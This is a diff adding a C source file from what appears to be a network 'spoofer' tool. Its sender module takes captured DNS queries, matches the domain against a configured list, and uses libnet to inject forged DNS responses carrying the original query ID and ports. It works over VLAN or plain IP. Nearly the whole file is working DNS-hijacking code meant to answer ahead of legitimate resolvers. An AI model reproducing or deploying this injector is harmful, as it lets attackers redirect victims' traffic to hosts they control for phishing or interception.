@@ -1,0 +1,559 @@
+/**
+ *
+ *  Copyright (C) 2014, DGL
+ *
+ *  this programe we build a dns response packet and send it to user.
+ *
+ *  the running env meght be in 802.1 vlan or not vlan.
+ *
+ *  if the env is vlan, open the link handle and  we send the packets in vlan.
+ *
+ *  if the env is not vlan, we open the raw handle and send the packets in ip interface level.
+ *
+ * */
+
+
+#include "../spoofer_main/spoofer_main.h"
+#include "spoofer_sender.h"
+#include "../spoofer_sniffer/spoofer_sniffer.h"
+#include "../spoofer_config/spoofer_config.h"
+#include "../spoofer_ipcs/spoofer_ipcs.h"
+#include "../spoofer_kernel/spoofer_kernel.h"
+
+
+#define SPOOFER_DNS_PORT	(53)
+#define SPOOFER_DNS_NO_SUM_CHECK	(0)
+#define SPOOFER_DNS_VOID_PALYLOAD_SIZE	(0)
+#define SPOOFER_DNS_NEW_PACKET_TARGE (0)
+
+
+#define SPOOFER_UDP_HEAD_TOTAL_LEN	(LIBNET_UDP_H + LIBNET_DNS_H)
+#define SPOOFER_IP_HEAD_TOTAL_LEN	(LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H)
+
+#define SPOOFER_DNS_IP_TTL  (72)    /* this ttl just for test */
+#define SPOOFER_DNS_IP_TOL  (0)     /* ip tol */
+
+
+libnet_t *dns_link_handler = NULL;
+libnet_t *dns_raw_handler = NULL;
+libnet_t *dns_link_tire = NULL;
+libnet_t *dns_raw_tire = NULL;
+
+
+/**
+ *  after send dns response's packet,
+ *  we have to reset the libnet spare tire here.
+ *
+ *  @param handle_d, is the dst handle.
+ *
+ *  @param handler_s, is the src handle.
+ *
+ *  @return nothing.
+ *
+ *  status finished, tested.
+ */
+
+static void copy_libnet_headler_info(libnet_t *handle_d, libnet_t *handle_s) {
+
+    libnet_clear_packet(handle_d);
+    libnet_clear_packet(handle_s);
+
+    handle_d->aligner = handle_s->aligner;
+    handle_d->device = handle_s->device;
+
+    handle_d->fd = handle_s->fd;
+
+    handle_d->injection_type = handle_s->injection_type;
+    handle_d->link_offset = handle_s->link_offset;
+    handle_d->link_type = handle_s->link_type;
+
+    handle_d->pblock_end  = NULL;
+    handle_d->protocol_blocks = NULL;
+
+    handle_d->total_size = 0;
+    handle_d->n_pblocks = 0;
+
+    strncpy(handle_d->label, LIBNET_LABEL_DEFAULT, LIBNET_LABEL_SIZE);
+    handle_d->label[sizeof(handle_d->label)] = '\0';
+}
+
+
+
+/**
+ *  workers create a libnet handle here.
+ *  use it to Cover libnet spare tire.
+ *
+ *  @param injection_type, is the type of driver.
+ *
+ *  @param dev, is the dev name.
+ *
+ *  @param errbuf, record the exec err info.
+ *
+ *  @return temp, is the libnet handle.
+ *
+ *  status finished, tested.
+ */
+
+static libnet_t *spo_create_and_init_libnet(
+        int injection_type, char *dev, char *errbuf) {
+
+    libnet_t *temp = NULL;
+    temp = libnet_init(injection_type, dev, errbuf);
+
+    if (temp == NULL ) {
+        exit(EXIT_FAILURE);
+    }
+
+    return temp;
+}
+
+
+/**
+ *  create a libnet handle's spare tire.
+ *  use it to send dns response packet.
+ *
+ *  @param void.
+ *
+ *  @return temp, is the libnet spare tire.
+ *
+ *  status finished, tested.
+ */
+
+static libnet_t *create_libnet_spare_tire() {
+
+    libnet_t *temp = NULL;
+    size_t len = sizeof(libnet_t);
+
+    temp = (libnet_t *)malloc(len);
+
+    if (temp == NULL) {
+        exit(EXIT_FAILURE);
+    }
+
+    memset(temp, 0, len);
+
+    return temp;
+}
+
+
+/**
+ *
+ *  create a libnet handle and it's spare tire.
+ *
+ *  @param dev_s, is the dev we send the packet.
+ *
+ *  @return int, is the exec status.
+ *
+ **/
+
+static SPO_RET_STATUS_INT spo_http_create_handle(char *dev_s) {
+
+    char error_raw[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
+    char error_vlan[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
+
+    if (dev_s == NULL) {
+        perror("dev_s is null exit\n");
+        exit(EXIT_FAILURE);
+    }
+
+    /* init handle */
+    if (dns_link_handler == NULL) {
+
+        dns_link_handler = spo_create_and_init_libnet(LIBNET_LINK, dev_s, error_vlan);
+        if (dns_link_handler == NULL) {
+            printf("init handle_link err, exit \n");
+            exit(EXIT_FAILURE);
+        }
+
+        dns_link_tire = create_libnet_spare_tire();
+        copy_libnet_headler_info(dns_link_tire, dns_link_handler);
+    }
+
+    if (dns_raw_handler == NULL) {
+
+        dns_raw_handler = spo_create_and_init_libnet(LIBNET_RAW4, dev_s, error_raw);
+
+        if (dns_raw_handler == NULL) {
+            printf("init handle_raw err, exit \n");
+            exit(EXIT_FAILURE);
+        }
+
+        dns_raw_tire = create_libnet_spare_tire();
+        copy_libnet_headler_info(dns_raw_tire, dns_raw_handler);
+    }
+
+    return SPOOFER_OK;
+}
+
+
+/**
+ *
+ *  here we send the dns response packet.
+ *
+ *  @param hjk_info, is the info that in dns request packet and we need it to built the packet.
+ *
+ *  @param handle, is the libnet handle we send the packet.
+ *
+ *  @param payload, is the dns response contents.
+ *
+ *  @param payload_size, is the contents size.
+ *
+ *  @return int, is the exec status.
+ *
+ **/
+
+static SPO_RET_STATUS_INT spo_dns_send_response(
+        spo_dns_hjk_info_t *hjk_info, libnet_t *handle, u_char *payload, int payload_size) {
+
+    int ret = 0;
+    libnet_ptag_t t;
+    u_short proto = IPPROTO_UDP; /* 传输层协议 */
+
+    t = libnet_build_dnsv4(
+                LIBNET_DNS_H,
+                hjk_info->dns_id,               /* dns id */
+                hjk_info->dns_flag,             /* flsge */
+                hjk_info->dns_ques,             /* question amount */
+                hjk_info->dns_ans,              /* answers */
+                hjk_info->dns_auth,             /* auth_rr */
+                hjk_info->dns_add,              /* addi_rr */
+                (uint8_t *)payload,             /* payload start */
+                payload_size,                   /* dns payload size */
+                handle,
+                SPOOFER_DNS_NEW_PACKET_TARGE
+                );
+
+    if (t == -1) {
+        printf("build dns err\n");
+        return (-3);
+    };
+
+    t = libnet_build_udp(
+                SPOOFER_DNS_PORT,                         			/* 源端口 */
+                hjk_info->src_port,                                 /* 目的端口 */
+                SPOOFER_UDP_HEAD_TOTAL_LEN + payload_size,          /* 长度 */
+                SPOOFER_DNS_NO_SUM_CHECK,                           /* 校验和,0为libnet自动计算 */
+                NULL,                                               /* 负载内容 */
+                SPOOFER_DNS_VOID_PALYLOAD_SIZE,                         /* 负载内容长度 */
+                handle,                                             /* libnet句柄 */
+                SPOOFER_DNS_NEW_PACKET_TARGE                        /* 新建包 */
+                );
+
+    if (t == -1) {
+        printf("libnet_build_udp failure\n");
+        return (-3);
+    };
+
+    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
+    t = libnet_build_ipv4(
+                SPOOFER_IP_HEAD_TOTAL_LEN + payload_size,           /* IP协议块的总长,*/
+                SPOOFER_DNS_IP_TOL,                      			/* tos */
+                (u_short) libnet_get_prand(LIBNET_PRu16),           /* id */
+                hjk_info->ip_off,                      				/* frag 片偏移 */
+                (u_int8_t)libnet_get_prand(LIBNET_PR8),             /* ttl */
+                proto,                                              /* 上层协议 */
+                SPOOFER_DNS_NO_SUM_CHECK,                           /* 校验和，此时为0，表示由Libnet自动计算 */
+                hjk_info->dst_address,                              /* 源IP地址,网络序 */
+                hjk_info->src_address,                              /* 目标IP地址,网络序 */
+                NULL,                                               /* 负载内容或为NULL */
+                0,                                                  /* 负载内容的大小*/
+                handle,                                             /* Libnet句柄 */
+                SPOOFER_DNS_NEW_PACKET_TARGE           				/* 协议块标记可修改或创建,0表示构造一个新的*/
+                );
+
+    if (t == -1) {
+        perror("libnet_build_ipv4 failure\n");
+        return (-4);
+    };
+
+    if (hjk_info->vlan_targe) {
+        printf("int vlan\n");
+        t = libnet_build_802_1q(
+                    hjk_info->src_mac,                                                  /* dest mac */
+                    hjk_info->dst_mac,                                                  /* source mac */
+                    ETHERTYPE_VLAN,                                                     /* TPI */
+                    (uint8_t) ((hjk_info->vlan_id & SPOOFER_VLAN_PROT_MASK)  >> 13),    /* priority (0 - 7) */
+                    (uint8_t) ((hjk_info->vlan_id & SPOOFER_VLAN_CFI_MASK) >> 12),      /* CFI flag */
+                    hjk_info->vlan_id & SPOOFER_VLAN_ID_MASK,                           /* vid (0 - 4095) */
+                    IPPROTO_IP,                                                         /*for ip*/
+                    NULL,                                                               /* payload */
+                    0,                                                                  /* payload size */
+                    handle,                                                             /* libnet handle */
+                    0);                                                                 /* libnet id */
+
+        if (t == -1) {
+            perror("803.1q err \n");
+            return -5;
+        }
+    }
+
+
+    ret = libnet_write(handle); /* 发送已经构造的数据包*/
+    libnet_clear_packet(handle);
+    if (ret < 0) {
+        perror("send packet err\n");
+    }else {
+        printf("pid %ld  send--%d\n", (long)getpid(), ret);
+    }
+
+    return 0;
+}
+
+
+
+/***********************  branch dns  ******************************/
+
+
+/**
+ *
+ *  packet the dns request info. uesed by build response packet.
+ *
+ *  @param packet, is the packet we catched.
+ *
+ *  @param node, is the rbt node, saved the response info.
+ *
+ *  @param dns_hjk_info, used to save the info taht build response packet.
+ *
+ *  @return int, is the exec status.
+ *
+ **/
+
+static SPO_RET_STATUS_INT spo_packeting_dns_hijack_info(
+        const u_char *packet, spo_rbt_node_t *node, spo_dns_hjk_info_t *dns_hjk_info) {
+
+    spo_sniff_ether_t *eth = NULL;
+    spo_sniff_ip_t *ip = NULL;
+    spo_sniff_udp_t *udp = NULL;
+    spo_sniff_dns_t *dns = NULL;
+    spo_cfg_dmn_url_t *dmn_url = NULL;
+
+    if (packet == NULL || node == NULL || dns_hjk_info == NULL) {
+        return SPOOFER_FAILURE;
+    }
+
+    eth = (spo_sniff_ether_t *) packet;
+
+    dns_hjk_info->vlan_targe = 0;
+
+    if (spo_is_802_1q_vlan(packet) == SPOOFER_TRUE) {
+        ip = (spo_sniff_ip_t *) (packet + SPOOFER_IP_OFFSET_VLAN);
+        udp = (spo_sniff_udp_t *) (packet + SPOOFER_UDP_OFFSET_VLAN);
+        dns = (spo_sniff_dns_t *) (packet + SPOOFER_DNS_OFFSET_VLAN);
+
+        dns_hjk_info->vlan_targe = SPOOFER_RUNNING_IN_VLAN;
+        dns_hjk_info->vlan_id = ntohs(*((u_short *) (packet + SPOOFER_VLAN_OFFSET)));
+    }else {
+        ip = (spo_sniff_ip_t *) (packet + SPOOFER_IP_OFFSET);
+        udp = (spo_sniff_udp_t *) (packet + SPOOFER_UDP_OFFSET);
+        dns = (spo_sniff_dns_t *) (packet + SPOOFER_DNS_OFFSET);
+
+        dns_hjk_info->vlan_targe = 0;
+        dns_hjk_info->vlan_id = 0;
+    }
+
+    memcpy(dns_hjk_info->src_mac, eth->ether_shost, ETHER_ADDR_LEN);
+    memcpy(dns_hjk_info->dst_mac, eth->ether_dhost, ETHER_ADDR_LEN);
+
+    dns_hjk_info->src_address = ip->ip_src.s_addr;
+    dns_hjk_info->dst_address = ip->ip_dst.s_addr;
+    dns_hjk_info->ip_off = ntohs(ip->ip_off);
+
+    dns_hjk_info->src_port = ntohs(udp->udp_sport);
+    dns_hjk_info->dst_port = ntohs(udp->udp_dport);
+
+    dns_hjk_info->dns_id = ntohs(dns->dns_id);
+    dns_hjk_info->dns_ques = ntohs(dns->dns_ques);
+
+    dmn_url = (spo_cfg_dmn_url_t *) node->key;
+    dns = (spo_sniff_dns_t *) dmn_url->data.data;
+
+    dns_hjk_info->dns_flag = ntohs(dns->dns_flag);
+    dns_hjk_info->dns_ans = ntohs(dns->dns_ans);
+    dns_hjk_info->dns_add = ntohs(dns->dns_add);
+    dns_hjk_info->dns_auth = ntohs(dns->dns_auth);
+
+    return SPOOFER_OK;
+}
+
+
+/**
+ *
+ *  get dns request host.
+ *
+ *  @param packet, is the packet we catched.
+ *
+ *  @param host, used save the host.
+ *
+ *  @return int, is the exec status.
+ *
+ **/
+
+static SPO_RET_STATUS_INT spo_dns_question_host(const u_char *packet, spo_str_t *host) {
+
+    size_t i = 0;
+    size_t quer_s = 0;
+    u_char *host_start = NULL;
+
+    if (packet == NULL || host == NULL) {
+        return SPOOFER_FAILURE;
+    }
+
+    if (spo_is_802_1q_vlan(packet) == SPOOFER_TRUE) {
+        host->data = (u_char *) (packet + SPOOFER_DNS_OFFSET_VLAN + LIBNET_DNS_H + 1);
+        host_start = host->data;
+        quer_s = spo_http_packet_size(packet) - 58;
+    }else {
+        host->data = (u_char *) (packet + SPOOFER_DNS_OFFSET + LIBNET_DNS_H + 1);
+        host_start = host->data;
+        quer_s = spo_http_packet_size(packet) - 54;
+    }
+
+    for (i = 0; i < quer_s; i++) {
+        if (*host_start == 0x00) {
+            host->len = i;
+            break;
+        }
+
+        host_start++;
+    }
+
+    if (i >= quer_s) {
+        host->data = NULL;
+        host->len = 0;
+        return SPOOFER_FAILURE;
+    }
+
+    return SPOOFER_OK;
+}
+
+
+/**
+ *
+ *  the dns request's type and class is we need ?
+ *
+ *  @param type_start, is the start pointer.
+ *
+ *  @return int, is the exec status.
+ *
+ **/
+
+static SPO_RET_BOOLEN_INT spo_dns_type_class(u_char *type_start) {
+
+    if (type_start == NULL) {
+        return SPOOFER_FALSE;
+    }
+
+    if (*((int *)type_start) == 0x01000100) {       /* if dns type not A or dns class not IN*/
+        return SPOOFER_TRUE;
+    }
+
+    return SPOOFER_FALSE;
+}
+
+
+/**
+ *
+ *  the spoofer sender. here call the func to finished the job.
+ *
+ *  @param packet, is the dns packet we catched.
+ *
+ *  @return int, is the exec status.
+ *
+ **/
+
+static SPO_RET_STATUS_INT spo_do_dns_sender(u_char *packet) {
+
+    spo_str_t host;
+    spo_rbt_node_t * node  = NULL;
+    spo_dns_hjk_info_t hjk_info;
+    spo_cfg_dmn_url_t *dmn_url = NULL;
+    u_char *data = NULL;
+
+    if (packet == NULL) {
+        return SPOOFER_FAILURE;
+    }
+
+    spo_init_string(&host, 1);
+    spo_dns_question_host(packet, &host);
+
+    if (spo_dns_type_class(host.data + host.len + 1) == SPOOFER_FALSE) {
+        return SPOOFER_FAILURE;
+    }
+
+    if ((node = spo_domain_match(spo_dns_dmn->rbt_header, &host)) == NULL) {
+        return SPOOFER_FAILURE;
+    }
+
+    memset(&hjk_info, '\0', sizeof(spo_dns_hjk_info_t));
+
+    if (spo_packeting_dns_hijack_info(packet, node, &hjk_info) == SPOOFER_FAILURE) {
+        return SPOOFER_FAILURE;
+    }
+
+    dmn_url = (spo_cfg_dmn_url_t *) node->key;
+    printf("match dns domain\n");
+
+    /* send it */
+    data = (u_char *)(dmn_url->data.data + LIBNET_DNS_H);
+
+    if (hjk_info.vlan_targe == SPOOFER_RUNNING_IN_VLAN) {
+       spo_dns_send_response(&hjk_info, dns_link_tire, data, dmn_url->data.len - LIBNET_DNS_H);
+       copy_libnet_headler_info(dns_link_tire, dns_link_handler);
+    }else {
+        spo_dns_send_response(&hjk_info, dns_raw_tire, data, dmn_url->data.len - LIBNET_DNS_H);
+        copy_libnet_headler_info(dns_raw_tire, dns_raw_handler);
+    }
+
+    return SPOOFER_OK;
+}
+
+
+
+/**
+ *
+ *  spoofer statrt here.
+ *
+ *  @param info_blk, is the cfg info.
+ *
+ *  @return nothing.
+ *
+ **/
+
+void spo_dns_sender(void *info_blk) {
+
+    int msgid = 0;
+    int ret = 0;
+
+    spo_cfg_ifo_blk_t *info = NULL;
+    spo_dns_packet_msg_t dns_msg;
+
+    if (info_blk == NULL) {
+        return;
+    }
+
+    usleep(200);
+
+    info = (spo_cfg_ifo_blk_t *) info_blk;
+
+    spo_http_create_handle((char *)info->dev_s);
+
+    memset(&dns_msg, '\0', sizeof(spo_dns_packet_msg_t));
+
+    msgid = info->dns_msgid[1];
+    msgid = spo_create_msg_queue(msgid, 0666);
+
+    while (1) {
+
+        ret = spo_msgrcv(msgid, &dns_msg, SPOOFER_DNS_PACKET_MSG_SIZE, SPOOFER_DNS_PACKET_MSG_TYPE, 0);
+        if (ret == SPOOFER_FAILURE) {
+            continue;
+        }
+
+        spo_do_dns_sender((u_char *) dns_msg.packet_info);
+
+        if (dns_dmn_safe == SPO_DMN_SAFE) {
+            spo_do_timeto_update_dns_domain((const char *) "./dns_domain");
+            dns_dmn_safe = 0;
+        }
+    }
+}
